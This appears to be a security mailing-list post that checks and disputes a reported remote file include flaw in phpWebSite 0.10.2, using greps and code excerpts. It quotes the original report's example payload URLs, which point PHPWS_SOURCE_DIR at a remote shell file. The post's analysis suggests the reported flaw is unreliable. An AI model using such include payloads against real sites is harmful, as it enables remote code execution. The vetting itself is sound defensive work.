Researcher: Crackers_Child (which is why I looked closer)

Reference: phpWebSite 0.10.2 Remote File Include Vulnerabilities
  <http://www.securityfocus.com/archive/1/archive/1/448098/100/0/threaded>

I downloaded the same software version, as specified in the URL
provided by Crackers_Child, and took a look.

Example exploits:

> mod/users/init.php?PHPWS_SOURCE_DIR=[http://Shel3ll.txt?](http://Shel3ll.txt)

If we look at init.php, we see:

   require(PHPWS_SOURCE_DIR."mod/users/class/Cookie.php");
   require(PHPWS_SOURCE_DIR."mod/users/class/ModSetting.php");
   require(PHPWS_SOURCE_DIR."mod/users/class/Forms.php");
   require(PHPWS_SOURCE_DIR."mod/users/class/Groups.php");

and nothing else.

So, we have a PHP constant.  Can't be controlled, right?

> mod/users/class/users.php?PHPWS_SOURCE_DIR=[http://Shel3ll.txt?](http://Shel3ll.txt)

Actually it's spelled "Users.php"

Anyway, we have things like this:

  require_once(PHPWS_SOURCE_DIR . 'core/Error.php');

for users/class/Cookie.php:

  require_once(PHPWS_SOURCE_DIR.'core/Form.php');

going to core/EZform.php:

  require_once PHPWS_SOURCE_DIR . "core/EZelement.php";

A grep for PHPWS_SOURCE_DIR returns 799 matches, almost all of which
are of the forms above, and one or two define's of the constant.
There is no evidence of any use of $_GET, $PHPWS_SOURCE_DIR, etc.
